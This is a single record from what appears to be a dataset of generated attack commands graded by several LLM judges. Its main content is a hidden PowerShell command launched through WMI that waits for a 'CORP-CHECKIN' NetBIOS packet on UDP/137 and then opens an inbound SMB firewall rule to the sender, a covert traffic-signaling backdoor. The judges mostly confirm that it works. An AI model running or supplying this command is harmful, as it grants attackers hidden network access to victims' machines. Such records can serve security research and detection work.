command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(137); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 50){ $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*CORP-CHECKIN*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled True -RemoteAddress $ep.Address; break } } } }'
explanation: Observes NetBIOS Name Service traffic on UDP/137 and checks for a uniquely encoded name containing 'CORP-CHECKIN' (application-specific NBNS name). When seen, it enables an SMB firewall rule for the signaling host.
rationale_steps: Create disabled inbound rule for TCP/445.
Bind to UDP/137 and scan NBNS payload for a sentinel name.
Enable the SMB rule restricted to the source IP upon match.

llm_judgments.syntactic_justification: The command is well-formed with balanced quotes/braces, valid PowerShell/WMI parameters, and correct escaping of embedded quotes.
llm_judgments.semantic_justification: It aligns with T1205 by listening for a network signal and toggling a firewall rule, but in practice it requires admin rights, may fail to bind to UDP/137 on Windows, and naively searches ASCII in a binary NBNS payload.

llm_judgments.syntactic_justification: The command is largely well-formed with proper PowerShell constructs, WMI invocation, and nested quoting using doubled single-quotes for the inner PowerShell string, though the complex multi-level quoting within the WMI ArgumentList string creates edge cases that could cause parsing failures in some environments.
llm_judgments.semantic_justification: The command accurately implements T1205 Traffic Signaling by listening on UDP/137 (NBNS) for a specific trigger string ('CORP-CHECKIN'), then conditionally enabling a pre-configured SMB firewall rule restricted to the signaling host's IP, which is a realistic and operationally coherent knock-based port-knocking/traffic-signaling mechanism.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct escaping for nested single quotes within the WMI ArgumentList and valid PowerShell syntax for the logic block.
llm_judgments.semantic_justification: The command accurately implements the traffic signaling technique by listening for a specific UDP payload to trigger a firewall modification; however, it requires administrative privileges (not 'None') and may encounter port conflicts if the native NetBIOS service is active on UDP/137.
